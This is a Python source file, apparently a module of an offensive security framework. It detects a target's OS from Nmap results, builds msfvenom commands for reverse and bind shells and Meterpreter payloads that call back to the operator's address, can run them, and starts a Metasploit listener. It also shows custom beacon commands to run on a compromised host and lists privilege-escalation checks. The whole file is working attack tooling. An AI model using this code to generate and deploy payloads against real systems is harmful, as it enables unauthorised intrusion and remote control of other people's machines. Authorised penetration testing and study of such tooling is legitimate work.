import os
import socket
from phantom.modules.base_module import BaseModule
from phantom.core.executor import run_command
from phantom.core.session import session
from phantom.utils.notifier import notifier
from rich.console import Console

console = Console()

PAYLOAD_TYPES = {
    "1": ("linux/x64/shell_reverse_tcp",         "Reverse shell TCP (Linux x64)"),
    "2": ("linux/x64/shell_bind_tcp",            "Bind shell TCP (Linux x64)"),
    "3": ("linux/x64/meterpreter/reverse_tcp",   "Meterpreter reverse TCP (Linux x64)"),
    "4": ("linux/x64/meterpreter/reverse_https", "Meterpreter reverse HTTPS (Linux x64)"),
    "5": ("linux/x86/shell_reverse_tcp",         "Reverse shell TCP (Linux x86)"),
    "6": ("windows/x64/shell_reverse_tcp",       "Reverse shell TCP (Windows x64)"),
    "7": ("windows/x64/meterpreter/reverse_tcp", "Meterpreter reverse TCP (Windows x64)"),
    "8": ("windows/x86/shell_reverse_tcp",       "Reverse shell TCP (Windows x86)"),
}

FORMATS = {
    "1": ("elf",  "ELF (Linux binary)"),
    "2": ("py",   "Python"),
    "3": ("sh",   "Bash one-liner"),
    "4": ("php",  "PHP"),
    "5": ("ps1",  "PowerShell"),
    "6": ("exe",  "Windows EXE"),
    "7": ("asp",  "ASP"),
    "8": ("war",  "WAR (Tomcat)"),
}


def _detect_os_from_xml(target: str) -> str:
    """
    Read OS detection results from the Nmap XML saved during scan.
    Returns a human-readable OS string, or empty string if not found.
    """
    from phantom.utils.paths import scan_xml_path
    xml_path = scan_xml_path(target)
    if not os.path.exists(xml_path):
        return ""

    try:
        import xml.etree.ElementTree as ET
        tree = ET.parse(xml_path)
        root = tree.getroot()

        for host in root.findall("host"):
            os_elem = host.find("os")
            if os_elem is None:
                continue

            # osmatch contains the best guess with accuracy percentage
            best_match = None
            best_accuracy = 0

            for osmatch in os_elem.findall("osmatch"):
                accuracy = int(osmatch.get("accuracy", "0"))
                if accuracy > best_accuracy:
                    best_accuracy = accuracy
                    best_match = osmatch.get("name", "")

            if best_match and best_accuracy >= 85:
                return best_match

    except Exception:
        pass

    return ""


def _os_to_payload_hint(os_string: str) -> tuple:
    """
    Given an OS string from nmap, return (arch, platform) hint.
    Returns ("x64", "linux"), ("x86", "linux"), ("x64", "windows"), etc.
    Defaults to ("x64", "linux") if unknown.
    """
    os_lower = os_string.lower()

    platform = "linux"
    if "windows" in os_lower:
        platform = "windows"
    elif "linux" in os_lower or "unix" in os_lower:
        platform = "linux"

    arch = "x64"
    if "x86-64" in os_lower or "64-bit" in os_lower or "amd64" in os_lower:
        arch = "x64"
    elif "i386" in os_lower or "i686" in os_lower or "x86" in os_lower or "32-bit" in os_lower:
        arch = "x86"
    # Default to x64 if unclear

    return arch, platform


class PayloadModule(BaseModule):
    module_name = "payload"

    def build_commands(self) -> dict:
        return {
            "CORE": ["generate", "privesc"],
            "LISTENER": ["handler <port> <payload>"]
        }

    def do_privesc(self, _):
        """privesc — List suggested Privilege Escalation tools and techniques for the target."""
        os_string, arch, platform = self._guess_os()
        
        console.print(f"\n[bold yellow]--- Privilege Escalation Assistant ({platform.capitalize()} {arch}) ---[/]")
        
        if platform == "windows":
            console.print("[bold]Suggested Tools:[/]")
            console.print("  - [green]WinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS")
            console.print("  - [green]PrivescCheck[/]: https://github.com/itm4n/PrivescCheck")
            console.print("  - [green]Seatbelt[/]: https://github.com/GhostPack/Seatbelt")
            console.print("\n[bold]Suggested Techniques:[/]")
            console.print("  - Check for Unquoted Service Paths")
            console.print("  - Check for AlwaysInstallElevated registry key")
            console.print("  - Check for Token Impersonation (SeImpersonatePrivilege)")
        else:
            console.print("[bold]Suggested Tools:[/]")
            console.print("  - [green]LinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS")
            console.print("  - [green]Linux Smart Enumeration (lse.sh)[/]: https://github.com/diego-treitos/linux-smart-enumeration")
            console.print("  - [green]linux-exploit-suggester[/]: https://github.com/The-Z-Old-GitHub-Repo-of-Linux-Exploit-Suggester/linux-exploit-suggester")
            console.print("\n[bold]Suggested Techniques:[/]")
            console.print("  - Check for SUID binaries (`find / -perm -u=s -type f 2>/dev/null`) ")
            console.print("  - Check for writable /etc/passwd or /etc/shadow")
            console.print("  - Check sudo permissions (`sudo -l`)")

    def _get_lhost(self) -> str:
        """Auto-detect local IP (VPN/tun0 or default route)."""
        from phantom.utils.network import get_lhost
        return get_lhost()

    def _guess_os(self) -> tuple:
        """
        Try to detect target OS from scan results.
        Returns (os_string, arch, platform).
        If detection fails, returns ("Unknown (defaulting to Linux x64)", "x64", "linux").
        """
        target = session.target
        if not target:
            return "Unknown (defaulting to Linux x64)", "x64", "linux"

        # 1. Try XML-based OS detection (most accurate)
        os_string = _detect_os_from_xml(target)
        if os_string:
            arch, platform = _os_to_payload_hint(os_string)
            return os_string, arch, platform

        # 2. Fallback: scan raw output in session results
        scan_data = session.get_result("scan")
        if scan_data and isinstance(scan_data, dict):
            all_output = " ".join(scan_data.values()).lower()

            if "windows" in all_output:
                # Try to detect arch from output
                arch = "x64" if "64-bit" in all_output or "x86_64" in all_output else "x86"
                return f"Windows (detected from scan output)", arch, "windows"

            if "linux" in all_output or "ubuntu" in all_output or "debian" in all_output or "centos" in all_output:
                arch = "x64" if "64-bit" in all_output or "x86_64" in all_output else "x64"
                return f"Linux (detected from scan output)", arch, "linux"

        # 3. No data available
        return "Unknown (defaulting to Linux x64)", "x64", "linux"

    def _suggest_payload(self, arch: str, platform: str) -> str:
        """Return the suggested payload key based on detected OS."""
        if platform == "windows":
            return "7" if arch == "x64" else "8"  # windows meterpreter or shell
        else:
            return "3" if arch == "x64" else "5"  # linux meterpreter or x86 shell

    def _suggest_format(self, platform: str) -> str:
        """Return suggested format key based on platform."""
        return "6" if platform == "windows" else "1"  # exe or elf

    def do_generate(self, _):
        """Interactive payload generation wizard with auto OS/arch detection."""
        console.print("\n[bold]-- PAYLOAD GENERATOR --[/]\n")

        # Auto-detect
        os_string, arch, platform = self._guess_os()
        lhost = self._get_lhost()

        notifier.info(f"Auto-detected Target OS: {os_string} ({arch})")
        notifier.info(f"LHOST: {lhost}")
        notifier.info(f"Target: {session.target or 'not set'}")
        console.print()

        # Payload types (include custom)
        from phantom.utils.payload_manager import get_custom_beacons
        custom_beacons = get_custom_beacons()
        
        all_payloads = PAYLOAD_TYPES.copy()
        
        # Add custom beacons as entries 9, 10, ...
        custom_mapping = {}
        for i, beacon in enumerate(custom_beacons, start=9):
            all_payloads[str(i)] = (beacon["command"], f"{beacon['description']} ({beacon['platform']})")
            custom_mapping[str(i)] = beacon

        # Payload type
        suggested_payload = self._suggest_payload(arch, platform)
        for k, (_, desc) in all_payloads.items():
            marker = " [dim](suggested)[/]" if k == suggested_payload else ""
            console.print(f"  [{k}] {desc}{marker}")

        while True:
            payload_choice = input(f"\n  Payload type [{suggested_payload}]: ").strip() or suggested_payload
            
            # Allow exit commands
            if payload_choice.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            # Validate choice
            if payload_choice in all_payloads or payload_choice in custom_mapping:
                break
            else:
                notifier.error(f"Invalid choice '{payload_choice}'. Enter a number from the list, or 'back' to exit.")
        
        if payload_choice in custom_mapping:
            beacon = custom_mapping[payload_choice]
            cmd = beacon['command']

            console.print(f"\n[bold green]Custom Beacon:[/bold green] [yellow]{beacon['description']}[/yellow]")
            console.print(f"[bold]Deployment command (to run on target):[/bold]\n    [yellow]{cmd}[/]\n")

            # Remove auto-execution because it runs LOCALLY on the pentester's machine.
            # Instead, just provide the command and instructions.
            notifier.info("Copy the command above and execute it on the compromised target.")
            notifier.warn("Note: Automatic execution is disabled for security reasons (it would run locally).")
            return

        payload_str, payload_desc = all_payloads.get(payload_choice, PAYLOAD_TYPES[suggested_payload])

        # Output format
        suggested_fmt = self._suggest_format(platform)
        console.print()
        for k, (_, desc) in FORMATS.items():
            marker = " [dim](suggested)[/]" if k == suggested_fmt else ""
            console.print(f"  [{k}] {desc}{marker}")

        while True:
            fmt_choice = input(f"\n  Output format [{suggested_fmt}]: ").strip() or suggested_fmt
            
            if fmt_choice.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            if fmt_choice in FORMATS:
                break
            else:
                notifier.error(f"Invalid format '{fmt_choice}'. Enter a number from the list, or 'back' to exit.")
        
        fmt_str, fmt_desc = FORMATS.get(fmt_choice, FORMATS[suggested_fmt])

        # LPORT validation
        while True:
            lport = input("  LPORT [4444]: ").strip() or "4444"
            
            if lport.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            try:
                port_num = int(lport)
                if 1 <= port_num <= 65535:
                    break
                else:
                    notifier.error(f"Port must be between 1 and 65535.")
            except ValueError:
                notifier.error(f"Invalid port '{lport}'. Enter a number 1-65535, or 'back' to exit.")
        
        out_file = input(f"  Output filename [shell.{fmt_str}]: ").strip() or f"shell.{fmt_str}"
        if out_file.lower() in ["back", "exit", "quit", "q"]:
            notifier.warn("Cancelled payload generation.")
            return

        cmd = f"msfvenom -p {payload_str} LHOST={lhost} LPORT={lport} -f {fmt_str} -o {out_file}"

        console.print(f"\n[bold][+] Generated command:[/]")
        console.print(f"    [yellow]{cmd}[/]\n")
        console.print("  [1] Execute + start listener automatically")
        console.print("  [2] Show command only (copy manually)")
        console.print("  [3] Edit command before executing")

        while True:
            action = input("\n  Choice [2]: ").strip() or "2"
            
            if action.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            if action in ["1", "2", "3"]:
                break
            else:
                notifier.error(f"Invalid choice '{action}'. Enter 1, 2, 3, or 'back' to exit.")

        if action == "1":
            run_command(cmd)
            notifier.success(f"Payload saved: {out_file}")
            self._start_listener(lport, payload_str)

        elif action == "2":
            console.print(f"\n  [yellow]{cmd}[/]\n")

        elif action == "3":
            new_cmd = input(f"  Edit command:\n  [{cmd}]\n  > ").strip()
            if new_cmd:
                run_command(new_cmd)
            else:
                run_command(cmd)

    def _start_listener(self, port: str, payload: str):
        """Start Metasploit multi/handler for the generated payload."""
        from phantom.modules.handler import HandlerModule
        notifier.status("Starting Metasploit listener...")
        HandlerModule().start_listener(port, payload)

    def do_run(self, _):
        self.do_generate(_)

    def do_preview(self, _):
        self.do_generate(_)
